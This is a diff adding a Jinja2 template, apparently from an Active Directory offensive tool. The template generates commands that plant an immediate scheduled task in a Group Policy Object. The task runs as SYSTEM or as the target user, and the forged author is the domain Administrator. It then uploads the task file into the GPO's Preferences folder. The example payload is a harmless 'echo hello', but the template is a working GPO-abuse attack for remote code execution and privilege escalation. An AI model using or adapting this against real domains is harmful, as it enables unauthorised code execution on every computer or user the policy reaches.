@@ -1,0 +1,38 @@
+{% set gpo = require['original_target'] %}
+{% if gpo.gpo_links_to_ou %}
+# The GPO {{gpo.name}} is linked on OU(s):
+    {% for dn in gpo.gpo_links_to_ou %}
+# {{dn}}
+    {% endfor %}
+{%- else %}
+# The GPO {{gpo.name}} is not linked to an OU
+{%- endif %}
+
+# Prepare the xml schedule task, mimic the real xml file. These parameters are the default
+# values when you create a new task.
+# - the author can be modified
+# - remove --args if you don't need it (don't do --args '')
+# - inside the xml, you can change the creation date (default is now)
+# - if you want to delay the execution, use --start-at DATE (see the help)
+{% if target.type == T_COMPUTER %}
+./tools/xmltask.py --version 1.2 --start-at immediate --author '{{domain_short_name}}\Administrator' --taskname 'taskname' --description 'description' --runlevel h --run-as-system --logontype S4U --filter '{{target.name}}' --cmd 'C:\Windows\System32\cmd.exe' --args '/c "echo hello >C:\hello.txt"' >ScheduledTasks.xml
+{%- elif target.type == T_USER %}
+./tools/xmltask.py --version 1.2 --start-at immediate --author '{{domain_short_name}}\Administrator' --taskname 'taskname' --description 'description' --runlevel l --run-as-user --logontype InteractiveToken --filter '{{domain_short_name}}\{{target.name}}' --filter-sid {{target.sid}} --cmd 'C:\Windows\System32\cmd.exe' --args '/c "echo hello >C:\hello.txt"' >ScheduledTasks.xml
+{% endif %}
+
+
+{% include '_pre_update_gpo.jinja2' %}
+
+# Create the subpath if not present and push ScheduledTasks.xml
+{% if target.type == T_COMPUTER %}
+cd /{{fqdn_lower}}/Policies/{{gpo.gpo_dirname_id}}/Machine/Preferences/ScheduledTasks
+{%- else %}
+cd /{{fqdn_lower}}/Policies/{{gpo.gpo_dirname_id}}/User/Preferences/ScheduledTasks
+{% endif %}
+
+## get ScheduledTasks.xml # to restore it if you want
+put ScheduledTasks.xml
+exit
+
+{% set extnames = '[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]' %}
+{% include '_post_update_gpo.jinja2' %}
